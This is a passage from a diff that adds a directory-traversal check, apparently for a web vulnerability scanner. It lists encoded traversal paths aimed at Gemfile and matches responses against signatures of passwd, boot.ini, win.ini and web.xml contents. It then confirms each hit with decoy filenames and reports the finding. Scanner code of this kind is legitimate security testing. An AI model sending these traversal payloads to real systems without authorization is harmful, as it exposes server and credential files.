+				"${dirName}/%5C../%5C../%5C../%5C../%5C../Gemfile",
+				"${dirName}/%5C..%2f%5C..%2f%5C..%2f%5C..%2f%5C..%2fGemfile"
+			   ];
+// add everything to full				 			   
+for (var i=0;i<variants_static.length;i++) {
+	if (variants_full.indexOf(variants_static[i]) == -1)
+		variants_full.push(variants_static[i]);
+}				 			   
+// ************************************************************************************** 
+{
+	// *********************************************************************************************
+	// class for testing the signs of an injection using text patterns found in the response text
+	// *********************************************************************************************	
+	function classInjectionPatterns(){
+		this.plainArray = [
+							"; for 16-bit app support",
+							"[boot loader]"
+						  ];
+		
+		this.regexArray = [
+							/((\w[\w-]+\:(!|\*|[^:]+)\:\d+\:\d+:[^:]*\:[^:]*\:[^\r^\n]*(\r?\n|\r|)){3})/,
+							/(<web-app[\s\S]+<\/web-app>)/,
+							/gem\s+(['"])[^\1]+?\1/
+						  ];											
+	}
+	// *********************************************************************************************
+	// search text for all the patterns from the list (plain text and regexes)
+	// *********************************************************************************************	
+	classInjectionPatterns.prototype.searchOnText = function(text) {
+		// search plain texts first
+		for (var i=0;i<this.plainArray.length;i++) {
+			if (text.indexOf(this.plainArray[i]) != -1) return this.plainArray[i];
+		}
+			
+		// search regexes
+		for (var i=0;i<this.regexArray.length;i++) {
+			var m = this.regexArray[i].exec(text);
+			if (m) return m[0];
+		}			
+			
+		return false;	
+	}
+}						 
+// **************************************************************************************
+// **************************************************************************************							 
+function alert(uri, job, variant, origFname, matchedText)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile("Directory_Traversal.xml");
+	ri.name = "Directory traversal";
+	ri.affects = origFname;
+	ri.alertPath = "Scripts/Directory Traversal";	
+	ri.details = "This file was found using the pattern [dark][bold]" + variant + "[/bold][/dark].[break]Original directory: [dark][bold]" + origFname + "[/bold][/dark]";
+	
+	ri.setHttpInfo(job);
+	
+	if (matchedText) {
+		ri.Details =  ri.Details + "[break]Directory traversal pattern found: [pre][blue]" + matchedText + "[/blue][/pre]";
+	}	
+	
+	AddReportItem(ri);	
+}							 
+	
+// **************************************************************************************
+function request(uri) {
+	lastJob = new THTTPJob();
+	
+	lastJob.url = scanURL;
+	lastJob.verb = 'GET';
+	lastJob.URI = uri;
+	lastJob.execute();	
+	
+	if (!lastJob.wasError)
+	{
+		return true;
+	}
+	
+	return false;
+}	
+// **************************************************************************************
+function requestConfirm(uri) {
+	lastJob2 = new THTTPJob();
+	
+	lastJob2.url = scanURL;
+	lastJob2.verb = 'GET';
+	lastJob2.URI = uri;
+	lastJob2.execute();	
+	
+	if (!lastJob2.wasError)
+	{
+		return true;
+	}
+	
+	return false;
+}	
+			
+// **************************************************************************************
+function testDir(dirPath, variant) {
+	var uri = variant.replace("${dirName}", dirPath);
+	if (request(uri))
+	{
+		var matchedText = injectionPatterns.searchOnText(lastJob.response.body);		
+		if (matchedText) {
+			// trace("confirm it");
+			// confirm it
+			var fakeURI = uri.replace("Gemfile", "Remfile").replace("passwd", "rasswd").replace("win.ini", "win.zzz").replace("boot.ini", "boot.zzz").replace("web.xml", "web.zml").replace("app.py", "app.zy");
+			if (requestConfirm(fakeURI)) {
+				// try to match again. it should not work
+				var matchedText2 = injectionPatterns.searchOnText(lastJob2.response.body);		
+				if (!matchedText2) {
+					alert(uri, lastJob, variant, dirPath, matchedText);
+					return true;
+				}
+			}
+		}
+	}
+	
+	return false;
+}
+/***********************************************************************************/
+function isStaticName(name){
+	for (var i=0; i<static_names.length; i++) {
+		if (name == static_names[i]) {
+			return true;
+		}
+	}
+	return false;
+}	
+/***********************************************************************************/
+function testForDirTraversal(sfFullPath, testFull) {
+	//var traceStr = "";
+	//if (testFull) traceStr = " FULL ";
+	//trace("testing " + traceStr + sfFullPath);
+	
+	if (testFull) variants=variants_full;
+	else variants=variants_static;
+	
+	// test it with all variants	
+	for (var i=0; i<variants.length; i++) 
+	{
+		if (testDir(sfFullPath, variants[i])) break;
+		ScriptProgress(ComputeProgress(i, variants.length));
+	}
+}
+/***********************************************************************************/
+function shuffle(o){ //v1.0
+    for(var j, x, i = o.length; i; j = Math.floor(Math.random() * i), x = o[--i], o[i] = o[j], o[j] = x);
+    return o;
+};
+/***********************************************************************************/
+function FindAndTestDirectories(list){
+	var dirs = [];
+	
+	// first select the ones that have classic names
+	for (var i=0;i<list.count; i++){	
+		var sf = list.getFile(i);
+		
+		if(!sf.ignored && (sf.scanSiteFile && sf.isDir && isStaticName(sf.name.toLowerCase()) )){
+			if (dirs.length<10) {
+				if (dirs.indexOf(sf.fullPath) == -1)
+					dirs.push(sf.fullPath);
+			}
+		}	
+	}
+	
+	//trace("-step 1-");
+	//for (var i=0;i<dirs.length; i++){
+	//	trace(dirs[i]);
+	//}
+	
+	var theRest = [];
+	
+	// then make a list with the rest of directories
+	for (var i=0;i<list.count; i++){
+		var sf = list.getFile(i);
+		
+		if(!sf.ignored && (sf.scanSiteFile && sf.isDir && !sf.isMarkedAs(MARKED_AS_RealDir))) {
+			theRest.push(sf.fullPath);
+		}	
+	}
+	// shuffle them to make sure we get a lot of coverage		
+	var theRestShuffled = shuffle(theRest);	
+	
+	//trace(theRestShuffled.length);
+	
+	// add from the shuffled list until we max out	
+	for (var i=0;i<theRestShuffled.length; i++){
+		if (dirs.length<25) {
+			if (dirs.indexOf(theRestShuffled[i]) == -1)
+				dirs.push(theRestShuffled[i]);
+		}
+	}
+	
+	//trace("-step 2-");
+	//for (var i=0;i<dirs.length; i++){
+	//	trace(dirs[i]);
+	//}	
+	
+	//trace("-step 3 (testing) -");
+	for (var i=0;i<dirs.length; i++){
+		testForDirTraversal(dirs[i], (i==0));
+	}	
+}	
+/***********************************************************************************/
+/* main entry point */
+var injectionPatterns = new classInjectionPatterns();
+var list = getNewFiles(0);
+FindAndTestDirectories(list);
